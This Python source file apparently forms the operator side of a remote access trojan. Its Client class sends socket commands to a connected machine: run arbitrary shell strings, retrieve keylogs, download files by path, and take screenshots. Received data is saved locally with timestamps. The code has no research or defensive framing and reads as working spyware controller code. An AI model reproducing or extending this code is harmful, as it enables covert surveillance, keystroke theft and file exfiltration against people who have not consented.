import os
import io
import json
import socket
import utility
import settings
from datetime import datetime


class Client:
    def __init__(self, conn: socket.socket, cid: int, manager) -> None:
        self._sock = conn
        self._cid = cid
        self._manager = manager

    @property
    def cid(self):
        return self._cid

    @property
    def sock(self):
        return self._sock

    # client interaction -------------------------------------------------------

    def _send(self, data: str, *args) -> None:
        self._sock.sendall(json.dumps({"cmd": data, "args": args}).encode("utf-8"))

    def _recieve_file(
        self, file_size: int, *, file_name: str = None, buffer_size: int = 1024
    ) -> None:
        """Called to receive large data (files/screenshots) from a client over the socket connection

        Args:
            file_size (int): Size of the file/data being received
            buffer_size (int, optional): buffer size of data to receive per attempt. Defaults to 1024.
        """
        # initialize a bytes object to write the received data to
        file_data = io.BytesIO()
        # start a loop that will keep trying to receive data until the file is fully received or a timeout occurs
        print(utility.padded("Receiving file..."))
        while True:
            # try to receive data from the client up to the buffer size
            buffer = self._sock.recv(buffer_size)
            # if the received data is empty...
            if not buffer:
                # break out of the loop
                break
            # otherwise, write the received data to the bytes object
            file_data.write(buffer)
            # output a status/progress message
            print(f"Status: {file_data.tell()}/{file_size} Bytes", end="\r", flush=True)
            # if the file is fully received...
            if file_data.tell() == file_size:
                # break out of the loop
                break
        print("\n", end="\r")
        # save the received data to a file
        if not os.path.exists(settings.FILE_DIRECTORY):
            os.makedirs(settings.FILE_DIRECTORY)
        date_str = datetime.now().strftime("_%m-%d-%Y_%H-%M-%S")
        file_name = date_str.join(os.path.splitext(file_name))
        with open(os.path.join(settings.FILE_DIRECTORY, file_name), "wb") as file:
            # write the data to the file
            file.write(file_data.getvalue())
            # output a confirmation message
            print(utility.padded(f"{file_name} has been saved"))

    # command handling ---------------------------------------------------------

    def execute(self, cmd: str, *args) -> None:
        """Called from the manager when executing a command on a specified client object.

        Args:
            cmd (str): command/instruction being executed and sent to the client
        """
        # fetch the function relative to the executed command
        func = (
            getattr(self, f"_{cmd}", None)
            if cmd in self._manager.get_commands().keys()
            else None
        )
        # if the function is found...
        if func is not None:
            # call function and pass anny arguments up to the function's argument limit
            func(*args[: func.__code__.co_argcount])

    def _command(self, command_string: str) -> None:
        self._send("command", command_string)

    def _keylogs(self) -> None:
        self._send("keylogs")
        print("keylogs executed")

    def _download(self, file_path: str) -> None:
        self._send("download", file_path)
        # file_size = self._sock.recv(1024)
        file_size = self._sock.recv(1024).decode("utf-8")
        if file_size.isdigit():
            self._recieve_file(int(file_size), file_name=os.path.basename(file_path))
        else:
            # TODO: file does not exist
            pass

    def _screenshot(self) -> None:
        self._send("screenshot")
        file_size = int(self._sock.recv(1024).decode("utf-8"))
        self._recieve_file(file_size, file_name=f"screenshot.png")
